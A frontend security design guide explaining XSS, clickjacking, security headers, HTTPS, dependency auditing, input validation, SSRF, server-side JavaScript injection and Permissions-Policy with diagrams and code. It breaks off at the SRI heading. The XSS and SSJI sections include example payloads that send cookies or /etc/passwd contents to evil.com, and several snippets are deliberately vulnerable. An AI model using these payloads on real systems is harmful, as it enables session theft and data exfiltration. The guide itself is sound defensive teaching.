# Frontend Security System Design

> A comprehensive guide covering critical frontend security concepts, architectural patterns, attack vectors, defenses, and real-world examples.

---

## Table of Contents

1. [Cross-Site Scripting (XSS)](#1-cross-site-scripting-xss)
2. [iFrame Protection](#2-iframe-protection)
3. [Security Headers](#3-security-headers)
4. [Client-Side Security](#4-client-side-security)
5. [Secure Communication (HTTPS)](#5-secure-communication-https)
6. [Dependency Security](#6-dependency-security)
7. [Compliance & Regulation](#7-compliance--regulation)
8. [Input Validation and Sanitization](#8-input-validation-and-sanitization)
9. [Server-Side Request Forgery (SSRF)](#9-server-side-request-forgery-ssrf)
10. [Server-Side JavaScript Injection (SSJI)](#10-server-side-javascript-injection-ssji)
11. [Feature Policy / Permissions-Policy](#11-feature-policy--permissions-policy)
12. [Subresource Integrity (SRI)](#12-subresource-integrity-sri)
13. [Cross-Origin Resource Sharing (CORS)](#13-cross-origin-resource-sharing-cors)
14. [Cross-Site Request Forgery (CSRF)](#14-cross-site-request-forgery-csrf)

---

## 1. Cross-Site Scripting (XSS)

### What is XSS?
XSS is an injection attack where malicious scripts are injected into trusted web pages. The browser executes the attacker's script in the context of the victim's session, leading to cookie theft, session hijacking, or defacement.

### Types of XSS

| Type | Description | Persistence |
|------|-------------|-------------|
| **Stored XSS** | Script is saved in the database and served to all users | Persistent |
| **Reflected XSS** | Script is embedded in the URL and reflected back | Non-persistent |
| **DOM-based XSS** | Manipulation happens entirely in the browser DOM | Client-side |

### Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    STORED XSS ATTACK FLOW                       │
└─────────────────────────────────────────────────────────────────┘

  Attacker                  Server                   Victim
     │                        │                         │
     │  POST /comment         │                         │
     │  <script>steal()</script>                        │
     │ ──────────────────────>│                         │
     │                        │  Stored in DB           │
     │                        │                         │
     │                        │    GET /page            │
     │                        │<────────────────────────│
     │                        │  Response with          │
     │                        │  malicious script       │
     │                        │ ────────────────────────>│
     │                        │                         │ Script executes!
     │   Cookie/Session data  │                         │ fetch('evil.com?c='
     │<──────────────────────────────────────────────── │  + document.cookie)
     │                        │                         │
```

```
┌─────────────────────────────────────────────────────────────────┐
│                   REFLECTED XSS ATTACK FLOW                     │
└─────────────────────────────────────────────────────────────────┘

  Attacker crafts URL:
  https://bank.com/search?q=<script>document.location='evil.com?c='+document.cookie</script>

  Attacker ──[sends link via email]──> Victim
                                          │
                                          ▼
                                    Clicks the link
                                          │
                                          ▼
                                    Browser sends GET to bank.com
                                          │
                                          ▼
                                    Server reflects unescaped q param
                                          │
                                          ▼
                                    Browser executes injected script
                                          │
                                          ▼
                                    Cookie sent to evil.com !!
```

### DOM-Based XSS Diagram

```
┌────────────────────────────────────────────────────────────┐
│                    DOM-BASED XSS                           │
│                                                            │
│  URL: https://app.com/#<img src=x onerror=alert(1)>        │
│                                                            │
│  JavaScript code (vulnerable):                             │
│  ┌──────────────────────────────────────────────────┐      │
│  │ const hash = location.hash.slice(1);             │      │
│  │ document.getElementById('output').innerHTML = hash│ ◄── SINK │
│  └──────────────────────────────────────────────────┘      │
│                           │                                │
│                    ┌──────▼──────┐                         │
│                    │    DOM      │                         │
│                    │ <div id=    │                         │
│                    │  "output">  │                         │
│                    │ <img src=x  │ ← malicious tag rendered│
│                    │  onerror=   │                         │
│                    │  alert(1)>  │                         │
│                    └────────────┘                          │
└────────────────────────────────────────────────────────────┘
```

### Real-World Example — Twitter (2010 XSS Worm)

The "onMouseOver" XSS worm infected 500,000+ accounts when a user hovered over a tweet. The payload auto-retweeted itself.

```
// Vulnerable (never do this)
element.innerHTML = userInput;

// Safe alternatives
element.textContent = userInput;          // Treats as plain text
element.innerText = userInput;            // Treats as plain text

// When HTML is required, use a sanitizer
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Defense Strategies

```
┌───────────────────────────────────────────────────────────┐
│                   XSS DEFENSE LAYERS                      │
│                                                           │
│  ┌─────────────────────────────────────────────────────┐  │
│  │ Layer 1: Input Validation (server + client)         │  │
│  └─────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────┐  │
│  │ Layer 2: Output Encoding (HTML, JS, URL, CSS)       │  │
│  └─────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────┐  │
│  │ Layer 3: Content Security Policy (CSP) Header       │  │
│  └─────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────┐  │
│  │ Layer 4: HttpOnly & Secure Cookie Flags             │  │
│  └─────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────┐  │
│  │ Layer 5: DOM Sanitization (DOMPurify)               │  │
│  └─────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────┘
```

```html
<!-- CSP Header example to block inline scripts -->
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://trusted-cdn.com; 
  object-src 'none'; 
  base-uri 'self';
```

```javascript
// React automatically escapes JSX — safe by default
const UserComment = ({ comment }) => <p>{comment}</p>;

// DANGER: dangerouslySetInnerHTML bypasses React's escaping
const Unsafe = ({ html }) => <div dangerouslySetInnerHTML={{ __html: html }} />;

// SAFE: sanitize before using dangerouslySetInnerHTML
import DOMPurify from 'dompurify';
const Safe = ({ html }) => (
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
);
```

---

## 2. iFrame Protection

### What are iFrame Threats?

iFrames can be used in **Clickjacking** attacks — overlaying an invisible iFrame over a UI element to trick users into clicking on hidden actions.

### Clickjacking Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    CLICKJACKING ATTACK                          │
└─────────────────────────────────────────────────────────────────┘

  Malicious Page (evil.com)
  ┌────────────────────────────────────────────────────────────┐
  │  [WIN A PRIZE! Click Here!]  ◄── Visible decoy button      │
  │                                                            │
  │  ┌──────────────────────────────────────┐ opacity:0        │
  │  │  bank.com (iFrame, invisible)        │                  │
  │  │                                      │                  │
  │  │  [Transfer $10,000 → Confirm]  ◄─────┼── Actual button  │
  │  │                                      │   user clicks    │
  │  └──────────────────────────────────────┘                  │
  └────────────────────────────────────────────────────────────┘

  User thinks they're clicking "WIN A PRIZE"
  But actually clicks "Confirm Transfer" on bank.com
```

### iFrame Defense Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                  IFRAME PROTECTION LAYERS                       │
│                                                                 │
│  1. X-Frame-Options Header                                      │
│     ┌─────────────────────────────────────────────────────┐     │
│     │  DENY          → never embedded in any frame        │     │
│     │  SAMEORIGIN    → only same origin can embed         │     │
│     │  ALLOW-FROM uri → only specific URI (deprecated)    │     │
│     └─────────────────────────────────────────────────────┘     │
│                                                                 │
│  2. CSP frame-ancestors directive (modern replacement)          │
│     ┌─────────────────────────────────────────────────────┐     │
│     │  frame-ancestors 'none'                             │     │
│     │  frame-ancestors 'self'                             │     │
│     │  frame-ancestors https://trusted.com                │     │
│     └─────────────────────────────────────────────────────┘     │
│                                                                 │
│  3. Sandbox attribute (restrict iFrame capabilities)            │
│     ┌─────────────────────────────────────────────────────┐     │
│     │  <iframe sandbox="allow-scripts allow-same-origin"> │     │
│     └─────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────────┘
```

### Real-World Example

```html
<!-- Embedding a payment widget safely -->
<iframe
  src="https://payments.stripe.com/checkout"
  sandbox="allow-scripts allow-forms allow-same-origin"
  allow="payment"
  title="Payment Form"
  loading="lazy"
></iframe>
```

```
// Server-side header configuration (Express.js)
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader(
    'Content-Security-Policy',
    "frame-ancestors 'self' https://trusted-partner.com"
  );
  next();
});
```

### Sandbox Attribute Permissions

| Permission | Description |
|---|---|
| `allow-scripts` | Allows JavaScript execution |
| `allow-forms` | Allows form submission |
| `allow-same-origin` | Allows same-origin requests |
| `allow-popups` | Allows window.open() |
| `allow-top-navigation` | Allows navigation of top-level frame |

---

## 3. Security Headers

### Overview

Security headers are HTTP response headers that instruct browsers on how to behave when handling content, providing an additional security layer.

### Security Headers Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                SECURITY HEADERS ECOSYSTEM                       │
│                                                                 │
│    Client Browser              Web Server                       │
│  ┌──────────────┐            ┌──────────────────────────┐       │
│  │              │  HTTP GET  │                          │       │
│  │    Browser   │ ─────────► │  Response Headers:       │       │
│  │              │            │                          │       │
│  │  Enforces:   │ ◄───────── │  ✓ CSP                   │       │
│  │  - CSP       │  Headers   │  ✓ HSTS                  │       │
│  │  - HSTS      │            │  ✓ X-Frame-Options       │       │
│  │  - CORS      │            │  ✓ X-Content-Type        │       │
│  │  - SRI       │            │  ✓ Referrer-Policy       │       │
│  └──────────────┘            │  ✓ Permissions-Policy    │       │
│                              └──────────────────────────┘       │
└─────────────────────────────────────────────────────────────────┘
```

### Key Security Headers Reference

```
┌──────────────────────────────────────────────────────────────────┐
│  HEADER                    │  PURPOSE                            │
├──────────────────────────────────────────────────────────────────┤
│  Content-Security-Policy   │  Controls resource loading origins  │
│  Strict-Transport-Security │  Forces HTTPS connections           │
│  X-Frame-Options           │  Prevents clickjacking              │
│  X-Content-Type-Options    │  Prevents MIME sniffing             │
│  Referrer-Policy           │  Controls referrer information      │
│  Permissions-Policy        │  Controls browser features          │
│  Cross-Origin-Opener-Policy│  Isolates browsing context          │
│  Cross-Origin-Embedder-Pol │  Controls cross-origin embeds       │
└──────────────────────────────────────────────────────────────────┘
```

### Real-World Implementation (Express.js with Helmet)

```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Helmet sets secure defaults for all major security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.myapp.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: {
    maxAge: 31536000,        // 1 year in seconds
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xFrameOptions: { action: 'sameorigin' },
}));
```

### HSTS Flow

```
┌────────────────────────────────────────────────────────────────┐
│               HSTS (HTTP Strict Transport Security)            │
│                                                                │
│  First Visit (HTTPS):                                          │
│  Browser ──HTTPS GET──► Server                                 │
│          ◄── Response with HSTS header ──                      │
│  Strict-Transport-Security: max-age=31536000; includeSubDomains│
│                                                                │
│  Future Visits:                                                │
│  User types: http://bank.com                                   │
│  Browser: "I know HSTS applies → auto-upgrade to HTTPS"        │
│  Browser ──HTTPS GET──► Server  (HTTP never reaches server)    │
│                                                                │
│  HSTS Preload:                                                 │
│  Sites submitted to browser preload list                       │
│  HTTPS enforced even on first visit (no TOFU vulnerability)    │
└────────────────────────────────────────────────────────────────┘
```

---

## 4. Client-Side Security

### Overview

Client-side security encompasses practices to protect code, data, and user interactions happening in the browser environment.

### Client-Side Threat Landscape

```
┌─────────────────────────────────────────────────────────────────┐
│               CLIENT-SIDE THREAT LANDSCAPE                      │
│                                                                 │
│  ┌─────────────────┐  ┌──────────────────┐  ┌───────────────┐  │
│  │   Malicious     │  │   Compromised    │  │  Third-party  │  │
│  │   User Input    │  │   Dependencies   │  │   Scripts     │  │
│  └────────┬────────┘  └────────┬─────────┘  └──────┬────────┘  │
│           └───────────────┬────┘                   │           │
│                           ▼                        │           │
│              ┌────────────────────────┐            │           │
│              │    Browser Sandbox     │ ◄──────────┘           │
│              │  ┌──────────────────┐  │                        │
│              │  │  Your Web App    │  │                        │
│              │  │  ┌────────────┐  │  │                        │
│              │  │  │ Sensitive  │  │  │                        │
│              │  │  │   Data     │  │  │                        │
│              │  │  └────────────┘  │  │                        │
│              │  └──────────────────┘  │                        │
│              └────────────────────────┘                        │
└─────────────────────────────────────────────────────────────────┘
```

### Best Practices

```javascript
// 1. NEVER store sensitive data in localStorage / sessionStorage
// Bad:
localStorage.setItem('authToken', jwtToken);
localStorage.setItem('password', userPassword);

// Better: Use HttpOnly cookies (inaccessible to JavaScript)
// Server sets: Set-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict

// 2. Avoid eval() and Function() constructor
// Bad:
eval(userInput);
new Function(userInput)();

// Good: Use JSON.parse for data, proper function calls for logic
const data = JSON.parse(userInput);

// 3. Use Trusted Types API to prevent DOM XSS
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('default', {
    createHTML: (input) => DOMPurify.sanitize(input),
    createScriptURL: (input) => {
      if (input.startsWith('https://trusted.com')) return input;
      throw new Error('Untrusted script URL');
    },
  });
}

// 4. Subresource Integrity for external scripts
// <script src="https://cdn.example.com/lib.js"
//         integrity="sha384-abc123..."
//         crossorigin="anonymous"></script>

// 5. Secure cookie handling
document.cookie = "session=token; Secure; SameSite=Strict; Path=/";
```

### Secrets Management Architecture

```
┌──────────────────────────────────────────────────────────────┐
│               SECRETS: WHERE NOT TO STORE                    │
│                                                              │
│  ❌ Source Code (git history exposure)                        │
│  ❌ localStorage / sessionStorage (XSS accessible)           │
│  ❌ JavaScript variables (memory dump)                       │
│  ❌ URL parameters (logged in access logs)                   │
│  ❌ HTML comments                                            │
│                                                              │
│               WHERE TO STORE                                 │
│                                                              │
│  ✓ HttpOnly Cookies (not accessible via JS)                  │
│  ✓ Server-side session store                                 │
│  ✓ Environment variables (server side only)                  │
│  ✓ Secrets Manager (AWS Secrets Manager, Vault)              │
└──────────────────────────────────────────────────────────────┘
```

---

## 5. Secure Communication (HTTPS)

### TLS Handshake Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    TLS 1.3 HANDSHAKE                            │
│                                                                 │
│  Client                                        Server           │
│    │                                              │             │
│    │──── ClientHello (supported ciphers, random)─►│             │
│    │                                              │             │
│    │◄─── ServerHello (chosen cipher, certificate)─│             │
│    │◄─── Certificate (public key)─────────────────│             │
│    │                                              │             │
│    │  Verify certificate against trusted CAs      │             │
│    │  Generate pre-master secret                  │             │
│    │──── ClientKeyExchange (encrypted) ──────────►│             │
│    │──── ChangeCipherSpec ────────────────────────►│             │
│    │──── Finished (encrypted) ───────────────────►│             │
│    │                                              │             │
│    │◄─── ChangeCipherSpec ────────────────────────│             │
│    │◄─── Finished (encrypted) ────────────────────│             │
│    │                                              │             │
│    │◄════════ Encrypted Application Data ════════►│             │
└─────────────────────────────────────────────────────────────────┘
```

### HTTP vs HTTPS

```
┌─────────────────────────────────────────────────────────────────┐
│                   HTTP (Insecure)                               │
│                                                                 │
│  Browser ──── GET /login ────────────────────────► Server       │
│               [username=admin&password=secret123]               │
│                         │                                       │
│                    MITM Attacker                                │
│                    Can read everything!                         │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                   HTTPS (Secure)                                │
│                                                                 │
│  Browser ──── Encrypted payload ────────────────── ► Server     │
│               [x8fK2#@!pQ9v...]                                 │
│                         │                                       │
│                    MITM Attacker                                │
│                    Sees only gibberish                          │
└─────────────────────────────────────────────────────────────────┘
```

### Certificate Pinning

```javascript
// Certificate Pinning in Service Worker (mobile/PWA)
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).then((response) => {
      // Validate certificate fingerprint
      // Note: Full cert pinning requires native/server-side logic
      return response;
    })
  );
});

// HPKP is deprecated — use Certificate Transparency + CAA DNS records instead
// DNS CAA record example:
// example.com. CAA 0 issue "letsencrypt.org"
// example.com. CAA 0 issuewild ";"
```

### Mixed Content Prevention

```html
<!-- Force upgrade of all HTTP resources to HTTPS -->
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">

<!-- Or via server header -->
<!-- Content-Security-Policy: upgrade-insecure-requests -->
```

---

## 6. Dependency Security

### Supply Chain Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│               SUPPLY CHAIN ATTACK SCENARIO                      │
│                                                                 │
│  1. Attacker publishes malicious "event-stream" patch           │
│                                                                 │
│  2. Popular package depends on event-stream                     │
│     your-app                                                    │
│       └── popular-lib@2.1.0                                     │
│             └── event-stream@3.3.6 ← MALICIOUS                  │
│                                                                 │
│  3. npm install → malicious code enters your app                │
│                                                                 │
│  4. Malicious code exfiltrates user credentials                 │
│                                                                 │
│  Real Example: event-stream attack (2018)                       │
│  - Targeted copay bitcoin wallet users                          │
│  - Stole cryptocurrency private keys                            │
└─────────────────────────────────────────────────────────────────┘
```

### Dependency Security Pipeline

```
┌─────────────────────────────────────────────────────────────────┐
│            SECURE DEPENDENCY MANAGEMENT PIPELINE                │
│                                                                 │
│  Development          CI/CD Pipeline         Production         │
│  ┌───────────┐       ┌─────────────────┐   ┌──────────────┐    │
│  │           │       │                 │   │              │    │
│  │ npm audit │──────►│ Snyk / Dependabot│──►│ Lock files   │    │
│  │           │       │                 │   │ (package-    │    │
│  │ yarn audit│       │ OWASP Dependency│   │  lock.json)  │    │
│  │           │       │ Check           │   │              │    │
│  │ Dependabot│       │                 │   │ SRI hashes   │    │
│  │ alerts    │       │ Block if HIGH   │   │ for CDN      │    │
│  │           │       │ severity found  │   │ resources    │    │
│  └───────────┘       └─────────────────┘   └──────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

### Real-World Commands & Configuration

```bash
# Audit dependencies
npm audit
npm audit --audit-level=high  # Fail only on high/critical

# Fix automatically
npm audit fix
npm audit fix --force  # ⚠️ May introduce breaking changes

# Generate lock file (commit this to git!)
npm install --package-lock-only

# Check for outdated packages
npm outdated

# Use Snyk for deeper analysis
npx snyk test
npx snyk monitor
```

```json
// .snyk policy file — suppress false positives
{
  "version": "v1.19.0",
  "ignore": {
    "SNYK-JS-LODASH-567746": [
      {
        "*": {
          "reason": "Not exploitable in our use case",
          "expires": "2025-12-31T00:00:00.000Z"
        }
      }
    ]
  }
}
```

```yaml
# GitHub Dependabot configuration
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    ignore:
      - dependency-name: "some-package"
        versions: ["1.x"]
```

---

## 7. Compliance & Regulation

### Key Standards Overview

```
┌─────────────────────────────────────────────────────────────────┐
│              COMPLIANCE STANDARDS FOR FRONTEND                  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  GDPR (EU)                                               │   │
│  │  - Consent for cookies/tracking                          │   │
│  │  - Right to erasure (delete account)                     │   │
│  │  - Data portability                                      │   │
│  │  - Privacy by design                                     │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  PCI-DSS (Payment Card Industry)                         │   │
│  │  - No card data in frontend storage                      │   │
│  │  - Use payment gateway iframes (Stripe, Adyen)           │   │
│  │  - HTTPS everywhere                                      │   │
│  │  - Regular vulnerability scans                           │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  WCAG (Accessibility)                                    │   │
│  │  - ARIA labels for screen readers                        │   │
│  │  - Keyboard navigation support                           │   │
│  │  - Color contrast ratios                                 │   │
│  └──────────────────────────────────────────────────────────┘   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  HIPAA (Healthcare)                                      │   │
│  │  - PHI must not be stored client-side unencrypted        │   │
│  │  - Audit logs for data access                            │   │
│  │  - Automatic logout on inactivity                        │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### GDPR Cookie Consent Implementation

```javascript
// Cookie Consent Manager (simplified)
const CookieConsent = {
  categories: {
    necessary: true,       // Always on
    analytics: false,
    marketing: false,
    preferences: false,
  },

  init() {
    const saved = localStorage.getItem('cookie-consent');
    if (!saved) {
      this.showBanner();
    } else {
      this.applyConsent(JSON.parse(saved));
    }
  },

  save(preferences) {
    // Store consent with timestamp for audit trail
    const consent = {
      ...preferences,
      timestamp: new Date().toISOString(),
      version: '1.0',
    };
    localStorage.setItem('cookie-consent', JSON.stringify(consent));
    this.applyConsent(preferences);
  },

  applyConsent(preferences) {
    if (preferences.analytics) {
      this.loadGoogleAnalytics();
    }
    if (preferences.marketing) {
      this.loadMarketingPixels();
    }
  },

  // Right to erasure
  eraseAllData() {
    localStorage.clear();
    sessionStorage.clear();
    // Delete cookies
    document.cookie.split(';').forEach((cookie) => {
      const name = cookie.split('=')[0].trim();
      document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
    });
    // Call API to delete server-side data
    fetch('/api/user/erase', { method: 'DELETE' });
  },
};
```

---

## 8. Input Validation and Sanitization

### Validation vs Sanitization

```
┌─────────────────────────────────────────────────────────────────┐
│          VALIDATION vs SANITIZATION                             │
│                                                                 │
│  Validation: Is the input acceptable?                           │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Input: "john@.com"  → REJECT (invalid email format)      │  │
│  │  Input: "999-999"    → REJECT (invalid phone format)      │  │
│  │  Input: "../../etc"  → REJECT (path traversal attempt)    │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                 │
│  Sanitization: Clean the input to make it safe                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Input: "<b>Hello</b><script>evil()</script>"             │  │
│  │  Output: "<b>Hello</b>"  (script tag removed)             │  │
│  │                                                           │  │
│  │  Input: "  hello world  "                                 │  │
│  │  Output: "hello world"   (trimmed)                        │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### Input Processing Pipeline

```
User Input
    │
    ▼
┌─────────────────────────┐
│  1. Client-side         │
│     validation          │  ← UX only, never rely on this alone
│     (HTML5 + JS)        │
└─────────────┬───────────┘
              │
              ▼
┌─────────────────────────┐
│  2. Encoding            │  ← Encode special chars before display
│     (output encoding)   │
└─────────────┬───────────┘
              │
              ▼
┌─────────────────────────┐
│  3. Server-side         │  ← AUTHORITATIVE validation
│     validation          │
└─────────────┬───────────┘
              │
              ▼
┌─────────────────────────┐
│  4. Sanitization        │  ← Strip or escape dangerous content
│     (DOMPurify/Bleach)  │
└─────────────┬───────────┘
              │
              ▼
┌─────────────────────────┐
│  5. Parameterized       │  ← Safe database interaction
│     queries / ORM       │
└─────────────────────────┘
```

### Real-World Validation Examples

```javascript
// Using Zod for schema-based validation (TypeScript)
import { z } from 'zod';

const UserRegistrationSchema = z.object({
  username: z
    .string()
    .min(3, 'Username too short')
    .max(20, 'Username too long')
    .regex(/^[a-zA-Z0-9_]+$/, 'Only alphanumeric and underscore allowed'),
  email: z.string().email('Invalid email format'),
  age: z.number().int().min(13, 'Must be 13+').max(120),
  website: z.string().url().optional(),
  bio: z
    .string()
    .max(500)
    .transform((val) => DOMPurify.sanitize(val)), // Sanitize HTML
});

// Validate
const result = UserRegistrationSchema.safeParse(formData);
if (!result.success) {
  console.error(result.error.issues);
  return;
}
// result.data is now type-safe and validated

// SQL Injection prevention — use parameterized queries
// BAD:
const query = `SELECT * FROM users WHERE email = '${email}'`;

// GOOD: Parameterized query
const query = 'SELECT * FROM users WHERE email = $1';
const result = await db.query(query, [email]);

// GOOD: ORM (Prisma)
const user = await prisma.user.findUnique({ where: { email } });
```

---

## 9. Server-Side Request Forgery (SSRF)

### What is SSRF?

SSRF tricks a server into making requests to unintended locations — typically internal services not accessible from the internet.

### SSRF Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                      SSRF ATTACK FLOW                           │
│                                                                 │
│  Internet                     Internal Network                  │
│  ─────────────────            ──────────────────────────        │
│                               ┌─────────────────────────┐      │
│                               │  Internal Services       │      │
│  Attacker                     │  ┌───────────────────┐   │      │
│  ┌───────┐                    │  │ AWS Metadata API  │   │      │
│  │       │  POST /fetch-url   │  │ 169.254.169.254   │   │      │
│  │       ├──────────────────► │  └───────────────────┘   │      │
│  │       │  url=http://       │  ┌───────────────────┐   │      │
│  │       │  169.254.169.254/  │  │ Database Server   │   │      │
│  │       │  latest/meta-data/ │  │ 10.0.0.5:5432    │   │      │
│  └───────┘                    │  └───────────────────┘   │      │
│                     Web App   │  ┌───────────────────┐   │      │
│                     fetches   │  │ Kubernetes API    │   │      │
│                     internal  │  │ 10.96.0.1:443     │   │      │
│                     resource! │  └───────────────────┘   │      │
│                               └─────────────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

### SSRF Defense

```javascript
const url = require('url');
const dns = require('dns').promises;

// Allowlist-based URL validation
async function isSafeUrl(inputUrl) {
  const parsed = new URL(inputUrl);

  // 1. Allowlist protocols
  const allowedProtocols = ['https:', 'http:'];
  if (!allowedProtocols.includes(parsed.protocol)) {
    throw new Error('Protocol not allowed');
  }

  // 2. Block private/internal IP ranges
  const hostname = parsed.hostname;
  const addresses = await dns.resolve4(hostname);

  for (const ip of addresses) {
    if (isPrivateIP(ip)) {
      throw new Error('Internal IP addresses are not allowed');
    }
  }

  // 3. Allowlist trusted domains
  const allowedDomains = ['api.trusted.com', 'cdn.example.com'];
  if (!allowedDomains.includes(hostname)) {
    throw new Error('Domain not in allowlist');
  }

  return true;
}

function isPrivateIP(ip) {
  const parts = ip.split('.').map(Number);
  return (
    parts[0] === 10 ||
    parts[0] === 127 ||
    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
    (parts[0] === 192 && parts[1] === 168) ||
    ip === '0.0.0.0' ||
    ip.startsWith('169.254.')  // link-local (AWS metadata)
  );
}
```

---

## 10. Server-Side JavaScript Injection (SSJI)

### What is SSJI?

SSJI occurs when user-supplied input is passed to server-side JavaScript execution functions like `eval()`, `setTimeout(string)`, or `Function()`, causing arbitrary code execution on the server.

### SSJI Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                       SSJI ATTACK                               │
│                                                                 │
│  Vulnerable Node.js endpoint:                                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  app.get('/calc', (req, res) => {                        │   │
│  │    const result = eval(req.query.expr); // DANGEROUS!    │   │
│  │    res.json({ result });                                 │   │
│  │  });                                                     │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  Attacker sends:                                                │
│  GET /calc?expr=require('child_process').exec('cat /etc/passwd',│
│            (err,stdout)=>require('http').get(                   │
│            'http://evil.com/?data='+stdout))                    │
│                                                                 │
│  Result: /etc/passwd contents sent to attacker's server!        │
└─────────────────────────────────────────────────────────────────┘
```

### Prevention

```javascript
// NEVER use eval() with user input
// NEVER use: setTimeout(string), setInterval(string), new Function(string)

// BAD — SSJI vulnerable
app.get('/filter', (req, res) => {
  const filter = eval(`(${req.query.filter})`); // RCE risk!
  const results = data.filter(filter);
  res.json(results);
});

// GOOD — safe filtering with allowlisted operations
const ALLOWED_FIELDS = ['name', 'age', 'email'];
const ALLOWED_OPS = ['eq', 'gt', 'lt', 'contains'];

app.get('/filter', (req, res) => {
  const { field, op, value } = req.query;

  if (!ALLOWED_FIELDS.includes(field)) {
    return res.status(400).json({ error: 'Invalid field' });
  }
  if (!ALLOWED_OPS.includes(op)) {
    return res.status(400).json({ error: 'Invalid operation' });
  }

  const results = data.filter((item) => {
    if (op === 'eq') return item[field] === value;
    if (op === 'gt') return item[field] > value;
    if (op === 'lt') return item[field] < value;
    if (op === 'contains') return String(item[field]).includes(value);
  });

  res.json(results);
});

// For math expressions: use a safe math parser
import { evaluate } from 'mathjs';
const safeResult = evaluate(userExpression); // sandboxed, no code execution
```

---

## 11. Feature Policy / Permissions-Policy

### Overview

Permissions-Policy (formerly Feature-Policy) is an HTTP header that allows web developers to selectively enable, disable, or modify browser features and APIs.

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│               PERMISSIONS-POLICY SCOPE                          │
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  Your Page (top-level origin)                            │  │
│  │  Permissions-Policy: camera=(), microphone=(), geoloc... │  │
│  │                                                           │  │
│  │  ┌────────────────────────────────────────────────────┐  │  │
│  │  │  Embedded iFrame (3rd party widget)                │  │  │
│  │  │  • Camera: BLOCKED (even if it asks)               │  │  │
│  │  │  • Microphone: BLOCKED                             │  │  │
│  │  │  • Geolocation: BLOCKED                            │  │  │
│  │  └────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### Common Policies & Values

```
┌────────────────────────────────────────────────────────────────┐
│  FEATURE               │  ()=none  │  self  │  *=all           │
├────────────────────────────────────────────────────────────────┤
│  camera                │  block    │  self  │  allow all       │
│  microphone            │  block    │  self  │  allow all       │
│  geolocation           │  block    │  self  │  allow all       │
│  payment               │  block    │  self  │  allow all       │
│  fullscreen            │  block    │  self  │  allow all       │
│  usb                   │  block    │  self  │  allow all       │
│  accelerometer         │  block    │  self  │  allow all       │
│  autoplay              │  block    │  self  │  allow all       │
│  clipboard-read        │  block    │  self  │  allow all       │
└────────────────────────────────────────────────────────────────┘
```

### Real-World Configuration

```javascript
// Express.js implementation
app.use((req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    [
      'camera=()',           // Disable camera for all
      'microphone=()',       // Disable microphone
      'geolocation=(self)',  // Allow only for same origin
      'payment=(self "https://checkout.stripe.com")', // Allow Stripe
      'fullscreen=(self)',
      'autoplay=()',
      'usb=()',
      'magnetometer=()',
      'accelerometer=()',
      'gyroscope=()',
    ].join(', ')
  );
  next();
});

// HTML iFrame — selectively grant permissions
<iframe
  src="https://maps.google.com/embed"
  allow="geolocation 'src'; fullscreen 'src'"
></iframe>

// iFrame — deny all permissions
<iframe
  src="https://third-party-widget.com"
  allow=""
  sandbox="allow-scripts allow-same-origin"
></iframe>
```

---

## 12. Subresource Integrity (SRI)

### What is SRI?

